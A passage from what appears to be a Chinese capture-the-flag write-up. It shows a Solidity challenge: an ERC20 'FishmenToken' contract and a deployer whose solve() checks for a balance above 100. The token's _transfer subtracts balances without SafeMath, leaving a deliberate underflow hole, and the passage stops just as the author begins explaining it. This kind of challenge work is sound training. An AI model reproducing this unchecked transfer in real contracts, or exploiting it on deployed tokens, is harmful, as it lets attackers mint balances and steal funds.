class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> contract Context &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_msgSender</span><span class="params">()</span> <span class="title">internal</span> <span class="title">view</span> <span class="title">virtual</span> <span class="title">returns</span> <span class="params">(address payable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_msgData</span><span class="params">()</span> <span class="title">internal</span> <span class="title">view</span> <span class="title">virtual</span> <span class="title">returns</span> <span class="params">(bytes memory)</span> </span>&#123;</span><br><span class="line">        this; <span class="comment">// silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691</span></span><br><span class="line">        <span class="keyword">return</span> msg.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IERC20</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> Returns the amount of tokens in existence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">totalSupply</span><span class="params">()</span> <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> Returns the amount of tokens owned by `account`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span><span class="params">(address account)</span> <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span><span class="params">(address recipient, uint256 amount)</span></span></span><br><span class="line"><span class="function">        <span class="title">external</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> <span class="params">(bool)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allowance</span><span class="params">(address owner, address spender)</span></span></span><br><span class="line"><span class="function">        <span class="title">external</span></span></span><br><span class="line"><span class="function">        <span class="title">view</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span><span class="params">(address spender, uint256 amount)</span> <span class="title">external</span> <span class="title">returns</span> <span class="params">(bool)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        address sender,</span></span></span><br><span class="line"><span class="function"><span class="params">        address recipient,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 amount</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> <span class="title">external</span> <span class="title">returns</span> <span class="params">(bool)</span></span>;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> Emitted when the allowance of a `spender` for an `owner` is set by</span></span><br><span class="line"><span class="comment">     * a call to &#123;approve&#125;. `value` is the new allowance.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(uint256 a, uint256 b)</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        <span class="keyword">require</span>(c &gt;= a, <span class="string">"SafeMath: addition overflow"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sub</span><span class="params">(uint256 a, uint256 b)</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sub(a, b, <span class="string">"SafeMath: subtraction overflow"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sub</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 a,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 b,</span></span></span><br><span class="line"><span class="function"><span class="params">        string memory errorMessage</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(b &lt;= a, errorMessage);</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mul</span><span class="params">(uint256 a, uint256 b)</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Gas optimization: this is cheaper than requiring 'a' not being zero, but the</span></span><br><span class="line">        <span class="comment">// benefit is lost if 'b' is also tested.</span></span><br><span class="line">        <span class="comment">// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522</span></span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        <span class="keyword">require</span>(c / a == b, <span class="string">"SafeMath: multiplication overflow"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">div</span><span class="params">(uint256 a, uint256 b)</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> div(a, b, <span class="string">"SafeMath: division by zero"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">div</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 a,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 b,</span></span></span><br><span class="line"><span class="function"><span class="params">        string memory errorMessage</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(b &gt; <span class="number">0</span>, errorMessage);</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line">        <span class="comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mod</span><span class="params">(uint256 a, uint256 b)</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mod(a, b, <span class="string">"SafeMath: modulo by zero"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mod</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 a,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 b,</span></span></span><br><span class="line"><span class="function"><span class="params">        string memory errorMessage</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(b != <span class="number">0</span>, errorMessage);</span><br><span class="line">        <span class="keyword">return</span> a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20 is Context, IERC20 &#123;</span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) <span class="keyword">private</span> _balances;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) <span class="keyword">private</span> _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 <span class="keyword">private</span> _totalSupply;</span><br><span class="line"></span><br><span class="line">    string <span class="keyword">private</span> _name;</span><br><span class="line">    string <span class="keyword">private</span> _symbol;</span><br><span class="line">    uint8 <span class="keyword">private</span> _decimals;</span><br><span class="line"></span><br><span class="line">    constructor(string memory name, string memory symbol) <span class="keyword">public</span> &#123;</span><br><span class="line">        _name = name;</span><br><span class="line">        _symbol = symbol;</span><br><span class="line">        _decimals = <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> Returns the name of the token.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">symbol</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decimals</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(uint8)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _decimals;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> See &#123;IERC20-totalSupply&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">totalSupply</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> See &#123;IERC20-balanceOf&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span><span class="params">(address account)</span> <span class="title">public</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span><span class="params">(address recipient, uint256 amount)</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">virtual</span></span></span><br><span class="line"><span class="function">        <span class="title">override</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> <span class="params">(bool)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _transfer(_msgSender(), recipient, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allowance</span><span class="params">(address owner, address spender)</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">view</span></span></span><br><span class="line"><span class="function">        <span class="title">virtual</span></span></span><br><span class="line"><span class="function">        <span class="title">override</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> <span class="params">(uint256)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span><span class="params">(address spender, uint256 amount)</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">virtual</span></span></span><br><span class="line"><span class="function">        <span class="title">override</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> <span class="params">(bool)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _approve(_msgSender(), spender, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        address sender,</span></span></span><br><span class="line"><span class="function"><span class="params">        address recipient,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 amount</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> <span class="title">public</span> <span class="title">virtual</span> <span class="title">override</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _approve(</span><br><span class="line">            sender,</span><br><span class="line">            _msgSender(),</span><br><span class="line">            _allowances[sender][_msgSender()].sub(</span><br><span class="line">                amount,</span><br><span class="line">                <span class="string">"ERC20: transfer amount exceeds allowance"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">increaseAllowance</span><span class="params">(address spender, uint256 addedValue)</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">virtual</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> <span class="params">(bool)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _approve(</span><br><span class="line">            _msgSender(),</span><br><span class="line">            spender,</span><br><span class="line">            _allowances[_msgSender()][spender].add(addedValue)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decreaseAllowance</span><span class="params">(address spender, uint256 subtractedValue)</span></span></span><br><span class="line"><span class="function">        <span class="title">public</span></span></span><br><span class="line"><span class="function">        <span class="title">virtual</span></span></span><br><span class="line"><span class="function">        <span class="title">returns</span> <span class="params">(bool)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _approve(</span><br><span class="line">            _msgSender(),</span><br><span class="line">            spender,</span><br><span class="line">            _allowances[_msgSender()][spender].sub(</span><br><span class="line">                subtractedValue,</span><br><span class="line">                <span class="string">"ERC20: decreased allowance below zero"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_transfer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        address sender,</span></span></span><br><span class="line"><span class="function"><span class="params">        address recipient,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 amount</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> <span class="title">internal</span> <span class="title">virtual</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(sender != address(<span class="number">0</span>), <span class="string">"ERC20: transfer from the zero address"</span>);</span><br><span class="line">        <span class="keyword">require</span>(recipient != address(<span class="number">0</span>), <span class="string">"ERC20: transfer to the zero address"</span>);</span><br><span class="line">        _balances[sender] = _balances[sender] - amount;</span><br><span class="line">        _balances[recipient] = _balances[recipient] + amount;</span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_mint</span><span class="params">(address account, uint256 amount)</span> <span class="title">internal</span> <span class="title">virtual</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(account != address(<span class="number">0</span>), <span class="string">"ERC20: mint to the zero address"</span>);</span><br><span class="line">        _totalSupply = _totalSupply.add(amount);</span><br><span class="line">        _balances[account] = _balances[account].add(amount);</span><br><span class="line">        emit Transfer(address(<span class="number">0</span>), account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_burn</span><span class="params">(address account, uint256 amount)</span> <span class="title">internal</span> <span class="title">virtual</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(account != address(<span class="number">0</span>), <span class="string">"ERC20: burn from the zero address"</span>);</span><br><span class="line">        _balances[account] = _balances[account].sub(</span><br><span class="line">            amount,</span><br><span class="line">            <span class="string">"ERC20: burn amount exceeds balance"</span></span><br><span class="line">        );</span><br><span class="line">        _totalSupply = _totalSupply.sub(amount);</span><br><span class="line">        emit Transfer(account, address(<span class="number">0</span>), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_approve</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        address owner,</span></span></span><br><span class="line"><span class="function"><span class="params">        address spender,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 amount</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> <span class="title">internal</span> <span class="title">virtual</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(owner != address(<span class="number">0</span>), <span class="string">"ERC20: approve from the zero address"</span>);</span><br><span class="line">        <span class="keyword">require</span>(spender != address(<span class="number">0</span>), <span class="string">"ERC20: approve to the zero address"</span>);</span><br><span class="line"></span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit Approval(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_setupDecimals</span><span class="params">(uint8 decimals_)</span> <span class="title">internal</span> </span>&#123;</span><br><span class="line">        _decimals = decimals_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Ownable is Context &#123;</span><br><span class="line">    address <span class="keyword">private</span> _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(</span><br><span class="line">        address indexed previousOwner,</span><br><span class="line">        address indexed newOwner</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    constructor() internal &#123;</span><br><span class="line">        address msgSender = _msgSender();</span><br><span class="line">        _owner = msgSender;</span><br><span class="line">        emit OwnershipTransferred(address(<span class="number">0</span>), msgSender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">owner</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        <span class="keyword">require</span>(_owner == _msgSender(), <span class="string">"Ownable: caller is not the owner"</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">renounceOwnership</span><span class="params">()</span> <span class="title">public</span> <span class="title">virtual</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(<span class="number">0</span>));</span><br><span class="line">        _owner = address(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferOwnership</span><span class="params">(address newOwner)</span> <span class="title">public</span> <span class="title">virtual</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(</span><br><span class="line">            newOwner != address(<span class="number">0</span>),</span><br><span class="line">            <span class="string">"Ownable: new owner is the zero address"</span></span><br><span class="line">        );</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract FishmenToken is ERC20(<span class="string">"FishmenToken"</span>, <span class="string">"FMT"</span>), Ownable &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mint</span><span class="params">(address _to, uint256 _amount)</span> <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        _mint(_to, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">burn</span><span class="params">(address _from, uint256 _amount)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        _burn(_from, _amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="deployer-sol"><a href="#deployer-sol" class="headerlink" title="deployer.sol"></a>deployer.sol</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"./erc20_fake.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract deployer &#123;</span><br><span class="line">    FishmenToken <span class="keyword">public</span> fishmenToken;</span><br><span class="line">    bool <span class="keyword">public</span> isSvd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        fishmenToken = <span class="keyword">new</span> FishmenToken();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">solve</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(fishmenToken.balanceOf(msg.sender) &gt; <span class="number">100</span>,<span class="string">"token balance &lt; 100"</span>);</span><br><span class="line">        isSvd = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isSolved</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isSvd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合约看着很长，搞了一个fishmantoken，但其实漏洞很简单，看到erc20_fake.sol里，虽然用了所谓的safemath，但是注意到合约ERC20里的_transfer函数，</p>
